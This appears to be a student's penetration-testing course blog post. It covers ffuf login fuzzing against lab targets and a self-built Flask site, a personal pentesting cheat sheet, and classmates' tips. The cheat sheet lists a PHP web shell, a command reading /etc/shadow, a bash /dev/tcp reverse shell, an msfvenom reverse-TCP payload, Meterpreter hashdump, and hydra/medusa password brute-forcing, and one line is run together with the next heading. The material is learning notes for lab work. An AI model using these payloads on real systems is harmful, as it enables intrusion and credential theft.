
..................
..................


I use this function in my `.zshrc` file

## Fuzz with stdin

```
fuzz-in() {
	strip=$(echo $1|sed 's/:\/\///')
	strip=$(echo $strip| sed 's/\\/\-/g')
	strip=$(echo $strip| sed 's/\//-/g')
	ffuf -u $1 -t 10 -o $strip.fuzz.txt -of md -p 1 "${@:2}" -w -
	echo "cat $strip.fuzz.txt"
}
```

`cat ~/tools/custom/wordlist-unique.txt | fuzz-in https://example.com/FUZZ -t 10 -mc all` 

OR 
`cat ~/tools/custom/wordlist-ext.txt | fuzz-in https://example.com/FUZZ -e php,log -t 100 -mc all -fw 40` 

This will automatically save `example.com.fuzz.txt` output file. 

## Multihost fuzzing for quickhits

```
multifuzz() {
	while read p; do
		strip=$(echo $p|sed 's/:\/\///')
		strip=$(echo $strip| sed 's/\\/\-/g')
		echo "Fuzzing: $p ($strip)"
		fuzz ~/tools/SecLists/Discovery/Web-Content/quickhits.txt $p/FUZZ -t 10 -p "0.1-0.2" -se > $strip.quickhits.txt
		echo "Sleeping for 1m"
		sleep 1m
	done < $1
}
```

`$ multifuzz /path/to/servers.httprobe.txt`


+++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++

h7 – Cheat sheet and web fuzzing
This is the seventh and final homework blog assignment from Tero Karvinen’s penetration testing course.

a) Web fuzzing with ffuf
Ffuf is a web fuzzing tool written in go. I cloned the git repo, and compiled the code:

Screenshot_2020-05-13_09-00-46

No gcc-style output on the build process, probably needs some flags, but a small reassurance on build success would be nice. The process is fast though, I used the ‘time’ command to get some output-

I have juiceshop running on my Kali VM’s localhost and a “fresh” Ubuntu 14.04 Metasploitable 3 running in VirtualBox. Btw not giving MS3 full Internet access makes it boot awfully slow. I installed it with vagrant, and there is a Windows version as well, but it is big as they come, and downloading it takes ages…

On Metasploitable 3, there is a phpmyadmin login screen available:

Screenshot_2020-05-13_09-17-39

I have Foxyproxy running on the Firefox, and I’m using mitmproxy to watch the traffic. Check Tero’s installation instructions of how to set those up!

I’ll first examine the POST data when login is attempted.

Screenshot_2020-05-13_09-35-12

Lets test the fuzzer then on this form. I’ll try admin:<password> first, and grab a classic list of passwords.

$ ./ffuf -w /usr/share/wordlists/rockyou.txt \
-d "pma_username=admin\&pma_password=FUZZ"   \
-u http://msp3/phpmyadmin/index.php
I fail to set up mitmproxy, so I turn to wireshark. Here is what the traffic should look like after sending normal login via web browser:

Screenshot_2020-05-13_15-54-37

And here is what goes after the command:

Screenshot_2020-05-13_15-57-33

Something has to be done. Note the User-Agent 🙂 What I remember from class discussion, the Content-Type has to be set. That goes into POST request header (-H). The ffuf syntax is very close to curl, so there is some familiarity here.

$ ./ffuf -w /usr/share/wordlists/rockyou.txt          \
-H "Content-Type: application/x-www-form-urlencoded"  \
-d "pma_username=admin\&pma_password=FUZZ"            \
-u http://msp3/phpmyadmin/index.php
Getting closer, that & escape character is apparently not needed in username.

Screenshot_2020-05-13_16-03-37

./ffuf -w /usr/share/wordlists/rockyou.txt:PASS      \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "pma_username=root&              \
pma_password=FUZZ&                  \
server=1&                           \
token=22fdac6e41393914b6286477edecd249"     \
-u http://msp3/phpmyadmin/index.php
Now the traffic looks right. I would like to fuzz usernames, so lets plug a list there too. I’ll try to format the syntax to be descriptive:

$ ./ffuf -u http://msp3/phpmyadmin/index.php             \
-w /usr/share/wordlists/metasploit/unix_users.txt:USER   \
-w /usr/share/wordlists/rockyou.txt:PASS                 \
-H "Content-Type: application/x-www-form-urlencoded"     \
-d "pma_username=USER&                                   \
    pma_password=PASS&                                   \
    server=1&                                            \
    token=22fdac6e41393914b6286477edecd249"              \
-fw 1,877
Also filtered out 1 and 877 word responses, but thats a lot of combinations… and should I follow redirects? I have to test with a setup that I know will succeed.

phpMyAdmin uses ‘root’ as the access-all-areas dude with an empty default password. I’ll set up a password that is guaranteed to be found, and test it. But Metasploitable3 ub1404 doesn’t want to co-operate. I get errors trying to configure mysql… Bah. I’ll make my own to have full control, and learn something new.

Web login form with Flask
One of my classmates, Nikita Ponomarev, demostrated how a simple login website was easy to code with Python and Flask. Two short tutorials, and I have a website running!

https://realpython.com/introduction-to-flask-part-1-setting-up-a-static-site/
https://realpython.com/introduction-to-flask-part-2-creating-a-login-page/

Screenshot_2020-05-13_17-31-20

That debugger that is on by default is pure gold.

Flask reminds me of Spring Boot and thymeleaf I learned on a course this spring, but this is in Python. Not in JavaTheLanguageOfLongMethodNamesAndCamelCase implements BigLibrariesIHaveNoClueWhatTheyReallyDo.

I’ll put a easy to guess credentials in, and check how the communications go with wireshark first. It turns out that I need that header defined.

run the fuzzer:

./ffuf -u http://localhost:5000/login                    \
-w /usr/share/wordlists/metasploit/unix_users.txt:USER   \
-w /usr/share/dict/wordlist-probable.txt:PASS            \
-H "Content-Type: application/x-www-form-urlencoded"     \
-d "username=USER&                                       \
password=PASS"                                           \
-fw 113
Ffuf is picky now: I have to provide -X POST flags, earlier they went in without. But finally the magic starts to happen. The error page has 113 words, so those answers are filtered out. This is too much combinations to try, and my website freezes and errors start to accumulate. I’ll go with the known username ‘admin’ to get results.

./ffuf -u http://localhost:5000/login                \
-w /usr/share/dict/wordlist-probable.txt             \
-H "Content-Type: application/x-www-form-urlencoded" \
-X POST -d "username=admin&password=FUZZ"            \
-fw 113
I was constantly checking data ins and outs with Wireshark to get this working. The tool is not that easy to use for the first time. But it is a good one for web fuzzing!

Screenshot_2020-05-13_18-17-05

Gotcha! One different result from another password needs a closer look later…

b) Construct a personal cheat sheet for pentesting
# tqre's cheat sheet for pentesting:

## Recon:
Fast scans for LANs:
	nmap -v $IP -oA OUTFILE
	grep Up $FILE.gnmap | py -x 'x.split()[1]' > IPFILE
Version scan from a list in IPFILE:
	nmap -sV $IP -iL IPFILE -oA OUTFILE
Extensive scans, top1000ports, all ports:
	nmap -A $IP -oA $OUTFILE
	nmap -A -p0- $IP -oA $OUTFILE
Mitmproxy basics:
        mitmproxy -p PORT
        'i' to intercept '~q' pattern for all requests
        'a' accept intercept -> forwards the request
Capture all traffic from an interface:
        sudo tcpdump -i INTERFACE -w FILE.pcap
Tshark monitor:
        sudo tshark -i INTERFACE
## Enumeration/fuzzing:
Web server directories:	
	gobuster dir -u $IP -w WORDLIST -o OUTFILE
Linux LinEnum script (add -t for thorough tests):
	./LinEnum.sh -r NAME
Ffuf web fuzzer:
	./ffuf -u http://localhost:5000/login			\
	-w /usr/share/wordlists/metasploit/unix_users.txt:USER	\
	-w /usr/share/dict/wordlist-probable.txt:PASS 		\
	-H "Content-Type: application/x-www-form-urlencoded" 	\
	-d "username=USER&password=PASS" 			\
	-fw 113
Hydra:
	hydra -V -l LOGIN -p PASSWORD TARGET -t 64 PROTOCOL
	-L and -P for login/passwords from files

## Volatility:
OS profile:
	vol.py -f dump.raw imageinfo
	vol.py --profile=? -f dump.raw PLUGIN
Plugins:
	pstree
	dumpfiles
	memdump
	cmdline
Additional flags:
	-S summary.txt
	-p process_number
	-D --dumpdir


## Password cracking:
Hashcat:
hashcat -a 0 -m HASHTYPE -o OUTFILE HASHFILE DICTIONARY
hashcat -a 1 -m HASHTYPE -o OUTFILE HASHFILE DICT1 DICT2
hashcat -a 3 -m HASHTYPE -o OUTFILE -r RULESFILE HASHFILE

Create dictionaries with princeprocessor:
pp --pw-min=# --pw-max=# --elem-cnt-max=# DICT > NEWDICT


## PHP:
Inject general function:
	<?php system($_GET['cmd']);?>
Single commands:
	<?php shell_exec('cat /etc/shadow');?>
Use the injected function via browser:  
	http://example.com/index.php?cmd=whoami	 
Netcat listener:  
	nc -lnvp PORT	
Reverse shell via browser to nc listener:  
	cmd=bash -c 'bash -i >%26 /dev/tcp/IP-ADDRESS/PORT 0>%261'  


## File upload with curl
	curl --data-binary @FILE DEST:PORT/FILENAME
## Python shell
	import pty;pty.spawn('/bin/bash## MySQL basic usage
	mysql -l LOGIN -pPASSWORD -e COMMAND
commands: 
	'show databases'
	'use DATABASE;show tables'
	'use DATABASE;select * from TABLE'	

## SSH Local port forwarding
Opens local_port to forward_ip:port, connecting via_host
	ssh -L local_port:forward_ip:port via_host
Open a port 8080 here to connect to target.com'salhost:1234
	ssh -L 8080:localhost:1234 user@target.com
c) Peer review
Here are some good catches and useful commands from classmates:

Nikita Ponomarev:
https://nikitushka.github.io/
Special props to Nikita for tipping about Flask usage for fuzzing tests!

Ghidra binary decompiler (cincan run):
	cincan run cincan/ghidra-decompiler decompile PROGRAM
Hashcat benchmark:
	hashcat -b
Wfuzz web application fuzzer:
	wfuzz -w WORDLIST -d "username=admin&password=FUZZ" IPADDRESS:PORT
Caius Juvonen:
https://caiusinfo.data.blog/

Medusa login fuzzer:
	medusa -h HOSTIP -u USERNAME -P PWDDICT -M ssh -t 100 -O OUTFILE
	-t = tries/second
Nmap treat hosts online '-Pn':
	nmap -Pn -A -oA OUTFILE TARGETIP
Nikto web server scanner: https://github.com/sullo/nikto
	nikto -Display 1234V -Tuning 6x -o niktoskan.html -Format htm -host 10.10.10.165
	-Tuning 6x = disable DoS
Arttu Talvio:
https://arttuslinux.wordpress.com/

Dirbuster:
	dirb IPADDRESS
Wordpress site enumeration:
	wpscan -v --url IPADDRESS
SMB fileserver protocol mapping and client usage:
	smbmap -H IP ADDRESS
	smbclient //IPADDRESS/DIR
Niko Heiskanen:
https://heiskane.github.io/

PHP shell payload with msfvenom:
	msfvenom -p METERPRETER_DIR/reverse_tcp LHOST=<local> LPORT=<port> -f raw > shell.php
inspect METERPRETER_DIR for different available payloads

Meterpreter process migration (via metasploit):
	meterpreter > ps
	meterpreter > migrate PID
	meterpreter > run exploit/os/example/hashdump
d) Recapitulation
Going through all the homework… added some missing references and spelling errors. I seem to be a heavy wikipedia user, at least when learning something new.

The work I did on HTB machine was really rewarding in the end. I covered quite a lot of ground. Some clueless ponderings are a bit embarrassing to read, but finding out how things really work is the only way to learn properly. Next HTB’s ones will probably be easier…

e) Bonus: Flags from HTB
I got finally in to OpenAdmin, and rooting it was easy after the user flag. The box had retired, I noticed it when submitting the user flag, so didn’t get HTB points for this. But lots of learned new things and tweaks 🙂

Screenshot_2020-05-13_08-51-00

The process altogether is reported in these 4 blog posts. I removed the password protection due to retired box.

https://tqre.wordpress.com/2020/04/12/h2-password-protected-part/
https://tqre.wordpress.com/2020/04/19/pentesting-h3-htb-openadmin/
https://tqre.wordpress.com/2020/04/27/htb-openadmin-web-shell/
https://tqre.wordpress.com/2020/05/12/htb-openadmin-has-retired-user-flag-found-at-least/
